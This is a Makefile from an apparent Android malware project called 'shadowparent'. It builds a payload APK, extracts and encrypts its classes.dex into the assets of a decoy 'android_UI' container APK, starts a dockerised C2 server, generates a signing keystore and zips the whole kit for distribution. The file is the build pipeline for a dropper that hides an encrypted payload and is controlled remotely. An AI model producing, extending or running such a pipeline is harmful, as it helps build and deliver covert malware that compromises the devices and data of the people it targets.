# shadowparent/Makefile
SHELL := /bin/bash
.ONESHELL:
.DEFAULT_GOAL := help

ANDROID_DIR := android
PAYLOAD_DIR := payload
C2_DIR := c2
BUILD_DIR := build
APK_OUT := $(BUILD_DIR)/android_UI.apk
PAYLOAD_APK := $(BUILD_DIR)/payload.apk
PAYLOAD_ENC := $(ANDROID_DIR)/app/src/main/assets/payload.dex.enc
ZIP_OUT := $(BUILD_DIR)/android_UI-full.zip

.PHONY: help
help:
	@echo "targets:"
	@echo "  make deps       — install python deps"
	@echo "  make keystore   — generate release keystore"
	@echo "  make payload    — build payload APK + encrypt DEX"
	@echo "  make apk        — build container APK"
	@echo "  make c2         — start C2 (docker)"
	@echo "  make zip        — package everything"
	@echo "  make all        — keystore + payload + apk + zip"
	@echo "  make clean      — remove build/"

.PHONY: deps
deps:
	pip3 install -r $(C2_DIR)/requirements.txt
	pip3 install cryptography qrcode pillow

.PHONY: keystore
keystore:
	bash wizard/gen_keystore.sh

.PHONY: payload
payload:
	cd $(ANDROID_DIR) && ./gradlew :payload:assembleRelease
	mkdir -p $(BUILD_DIR)
	cp $(PAYLOAD_DIR)/build/outputs/apk/release/payload-release.apk $(PAYLOAD_APK)
	# Распаковываем classes.dex из payload APK и шифруем
	mkdir -p $(BUILD_DIR)/payload_extract
	cd $(BUILD_DIR)/payload_extract && unzip -o ../payload.apk classes.dex
	python3 tools/encrypt_payload.py \
	    $(BUILD_DIR)/payload_extract/classes.dex \
	    $(PAYLOAD_ENC)
	@echo "[+] payload DEX encrypted → $(PAYLOAD_ENC)"

.PHONY: apk
apk:
	cd $(ANDROID_DIR) && ./gradlew :app:assembleRelease
	mkdir -p $(BUILD_DIR)
	cp $(ANDROID_DIR)/app/build/outputs/apk/release/app-release.apk $(APK_OUT)
	@echo "[+] APK → $(APK_OUT)"

.PHONY: c2
c2:
	cd $(C2_DIR) && docker compose up -d --build

.PHONY: zip
zip:
	mkdir -p $(BUILD_DIR)/pkg
	cp -r $(ANDROID_DIR) $(BUILD_DIR)/pkg/
	cp -r $(PAYLOAD_DIR) $(BUILD_DIR)/pkg/
	cp -r $(C2_DIR) $(BUILD_DIR)/pkg/
	cp -r wizard $(BUILD_DIR)/pkg/
	cp -r tools $(BUILD_DIR)/pkg/
	cp Makefile .env.example README.md $(BUILD_DIR)/pkg/
	cp $(APK_OUT) $(PAYLOAD_APK) $(BUILD_DIR)/pkg/
	cd $(BUILD_DIR)/pkg && zip -r ../android_UI-full.zip .
	@echo "[+] ZIP → $(ZIP_OUT)"

.PHONY: all
all: keystore payload apk zip
	@echo "[✓] full package ready: $(ZIP_OUT)"

.PHONY: clean
clean:
	rm -rf $(BUILD_DIR)
	cd $(ANDROID_DIR) && ./gradlew clean || true